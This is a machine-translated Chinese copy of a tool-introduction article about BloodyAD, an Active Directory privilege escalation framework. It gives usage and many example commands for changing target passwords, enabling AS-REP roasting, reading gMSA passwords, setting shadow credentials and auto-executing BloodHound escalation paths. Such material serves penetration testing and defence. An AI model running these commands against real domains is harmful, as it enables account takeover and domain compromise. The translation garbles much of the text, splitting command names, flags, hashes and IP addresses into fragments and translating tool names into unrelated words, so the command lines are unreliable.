# BloodyAD:一个活动目录权限提升框架

> 原文：<https://kalilinuxtutorials.com/bloodyad/>

[![](img/c0c43a79c264e165b095424069d551db.png)](https://blogger.googleusercontent.com/img/a/AVvXsEiJfycVzNwuwf9WYAKW1by0FSHWo8_xmqCxm5ZLX8UAYamgiQB_isBFpBpc-L9HIzEf-qY_RDqBH7cvkPs1GpaG0CPKcgGdnjVwCBIs9u9QaBxmKd1S0ZI0haQTZpLl7LR1b0IwHygq95hjuzq67OB0wY0rg4mVt8SZeRtwXKme7TF89TF6uEwz_suz=s765)

**BloodyAD** 是一个活动目录权限提升框架，可以使用`**bloodyAD.py**`手动使用，也可以结合`**pathgen.py**`和`**autobloody.py**`自动使用。

此框架支持 NTLM(使用密码或 NTLM 哈希)和 Kerberos 身份验证，并绑定到域控制器的 LDAP/LDAPS/SAMR 服务以获得 AD 权限。

它被设计成透明地与 SOCKS 代理一起使用。

**血腥镇压**

**描述**

此工具可以对域控制器执行特定的 LDAP/SAMR 调用，以便执行 AD 特权。

### 要求

以下是必需的:

*   python3
*   DSinternals
*   冲击
*   Ldap3 为您的虚拟环境使用 requirements . txt:`**pip3 install -r requirements.txt**`

### 用法

简单用法:

**python blood YAD . py–host 172 . 16 . 1 . 15-d MYDOM-u my user-p:70016778 CB 0524 c 799 AC 25 b 439 BD 6a 31 change password my target ' password 123！'**

所有可用功能的列表

**【blood YAD】$ python blood YAD . py-h
用法:blood YAD . py[-h][-d DOMAIN][-u USERNAME][-k][-s { LDAP，ldaps，RPC }][–HOST HOST]
{ getobject attributes，setAttribute，addUser，addComputer，delObject，changePassword，addObjectToGroup，
addForeignObjectToGroup，delObjectFromGroup，getChildObjects，setShadowCredentials，setGenericAll –Kerberos
-s { ldap，ldaps，rpc}，–scheme { LDAP，ldaps，rpc}
在 TLS 上使用 LDAP(默认为 LDAP)
–DC 的主机主机主机名或 IP(例如:my.dc.local 或 172.16.1.3)
命令:
{getObjectAttributes，setAttribute，addUser，addComputer，delObject，changePassword，addObjectToGroup，
addforeignobj**

使用特定功能的帮助文本:

**【blood YAD】$ python blood YAD . py–host 172 . 16 . 1 . 15-d MYDOM-u my user-p:70016778 CB 0524 c 799 AC 25 b 439 BD 6a 31 Change password-h
用法:
使用 LDAPS 或 RPC 在不知道旧密码的情况下更改目标密码
Args:
identity:目标的 sAMAccountName、DN、GUID 或 SID(必须对其有写权限)【T5**

### 它是如何工作的

bloodyAD 主要使用 LDAP 协议与 DC 通信，以获取信息或添加/修改/删除 AD 对象。不能使用 LDAP 更新密码，它必须是 LDAPS 或 SAMR 的安全连接。默认情况下，DC 没有激活 LDAPS，因为它必须进行配置(使用证书),因此在这些情况下使用 SAMR。

### 有用的命令

**获取群成员
python bloody ad . py-u John . doe-d bloody-p password 512！–host 192 . 168 . 10 . 2 getObjectAttributes Users 成员
获取最小密码长度策略
python bloody ad . py-u John . doe-d bloody-p password 512！–host 192 . 168 . 10 . 2 getobject attributes ' DC = bloody，DC=local' minPwdLength
获取 AD 功能级别
python bloody AD . py-u Administrator-d bloody-p password 512！–host 192 . 168 . 10 . 2 getobject attributes ' DC =血腥，DC =本地' msDS-Behavior-Version
获取该域的所有用户
python bloody ad . py-u John . doe-d bloody-p password 512！–host 192 . 168 . 10 . 2 Get child objects ' DC =血腥，DC =本地'用户
获取该域的所有计算机
python bloody ad . py-u John . doe-d bloody-p password 512！–host 192 . 168 . 10 . 2 Get child objects ' DC =血腥，DC =本地'计算机
获取该域的所有容器
python bloody ad . py-u John . doe-d bloody-p password 512！–host 192 . 168 . 10 . 2 get child objects ' DC =血腥，DC =本地'容器
启用 DONT_REQ_PREAUTH 进行 asre proast
python blood YAD . py-u Administrator-d bloody-p password 512！–host 192 . 168 . 10 . 2 setuseracountcontrol John . doe 0x 400000
Disable account Disable
python bloody ad . py-u Administrator-d bloody-p password 512！–host 192 . 168 . 10 . 2 setUserAccountControl John . doe 0x 0002 False
获取 user account control 标志
python bloody ad . py-u Administrator-d bloody-p password 512！–主机 192 . 168 . 10 . 2 getobject attributes John . doe user account control
读取 GMSA 帐户密码
python bloody ad . py-u John . doe-d bloody-p password 512–主机 192 . 168 . 10 . 2-s ldaps getobject attributes gmsaAccount $ msDS-Man**aged password

# 自体血液

### 描述

该工具自动执行两个 AD 对象之间的 AD 特权，即源(我们拥有的对象)和目标(我们想要的对象)之间的特权，如果存在特权路径的话。自动化分为两部分:

*   `**pathgen.py**`使用 bloodhound 数据和 neo4j 查询找到 privesc 的最佳路径。
*   `**autobloody.py**`执行用`**pathgen.py**`找到的路径

### 要求

以下是必需的:

*   python3
*   DSinternals
*   冲击
*   Ldap3
*   大猎犬
*   Neo4j python 驱动程序
*   Neo4j 与 GDS 图书馆

### 如何使用

首先必须将数据导入 BloodHound(例如使用 SharpHound 或 BloodHound.py ),并且 Neo4j 必须正在运行。

简单用法:

**pathgen . py-DP neo4j pass-ds ' OWNED _ USER @ ATTACK。LOCAL '-dt ' TARGET _ USER @攻击。LOCAL '&&auto bloody . py-d ATTACK-u ' owned _ user '-p ' owned _ user _ pass '–host 172 . 16 . 1 . 15**

`**pathgen.py**`的完整帮助:

**$ python pathgen.py -h
用法:pathgen . py[-h][–DBURI DBURI][-du DBUSER]-DP db password-ds db source-dt db target[-f file path]
Active Directory 权限提升框架
可选参数:
-h，–help 显示此帮助消息并退出
–DBURI DBURI 主机 neo4j 正在其上运行。默认值:localhost。
-du DBUSER，–DBUSER DBUSER
Neo4j 要使用的用户名
-dp DBPASSWORD，–db password db password
Neo4j 要使用的密码
-ds DBSOURCE，–db source db source
源节点的区分大小写标签(bloodhound 中的 name 属性)
-dt DBTARGET，–db target db target
目标节点的区分大小写标签(bloodhound 中的 name 属性)
-f FILEPATH，–File path File path【T11**

### 它是如何工作的

首先`**pathgen.py**`使用 Neo4j 的 GDS 库中实现的 Dijkstra 算法生成一个 privesc 路径。Dijkstra 算法允许解决加权图上的最短路径问题。默认情况下，bloodhound 创建的边没有权重，只有类型(例如 MemberOf，WriteOwner)。然后，根据边的类型和到达的节点的类型(例如，用户、组、域)，将权重添加到每个边。

一旦路径生成并存储为 json 文件，`**autobloody.py**`将连接到 DC，执行路径并清除可逆的内容(除了密码更改)。

[**Download**](https://github.com/CravateRouge/bloodyAD)